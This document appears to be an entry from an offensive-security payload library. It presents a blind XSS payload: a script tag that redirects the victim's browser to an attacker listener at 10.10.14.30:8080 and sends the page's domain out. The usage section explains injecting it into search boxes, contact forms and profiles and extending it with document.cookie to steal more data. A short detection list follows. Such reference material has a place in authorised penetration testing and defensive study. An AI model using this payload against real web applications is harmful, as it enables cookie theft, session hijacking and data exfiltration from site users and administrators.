---
id: 8b524b46-862b-4975-b1d2-a20f0dc70fe8
name: Blind-XSS-Data-Grabber-Payload
type: code
language: HTML
verified: true
created_at: '2023-04-06T03:56:42.227863+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
  - Browser
tags:
  - xss
  - payload
  - exfiltration
validated: true
---

# Blind-XSS-Data-Grabber-Payload

## Code

```html
<script>document.location='http://10.10.14.30:8080/XSS/grabber.php?c='+document.domain</script>
```

## Description

This HTML/JavaScript payload is designed for blind XSS exploitation. When injected into a vulnerable input and executed (e.g., in an admin view or log), it redirects the victim's browser to an attacker-controlled URL, appending the document domain as a query parameter. This allows confirmation of the vulnerability and basic data exfiltration without visible feedback to the attacker.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `http://10.10.14.30:8080/XSS/grabber.php` | Attacker's server URL and endpoint for receiving data | `http://attacker-ip:8080/XSS/grabber.php` |
| `document.domain` | The target page's domain, automatically captured and appended | `victim-site.com` |

## Usage

Inject this payload into vulnerable fields like search boxes, contact forms, or user profiles in a web application. It triggers on execution in a blind context, sending a GET request to your listener (e.g., set up with [[commands/ruby-start-simple-http-server]]). Customize the URL to point to your server and add more data (e.g., `+document.cookie`) for richer exfiltration. Used in procedures like [[procedures/Blind-XSS-Data-Exfiltration]] for verifying and exploiting blind XSS.

## Detection

- Browser developer tools or network logs showing unexpected redirects to external domains.
- Web Application Firewall (WAF) rules matching script injections or outbound requests with encoded payloads.
- Server-side logging of anomalous query parameters in admin or log views.

## Related

- [[procedures/Blind-XSS-Data-Exfiltration]]
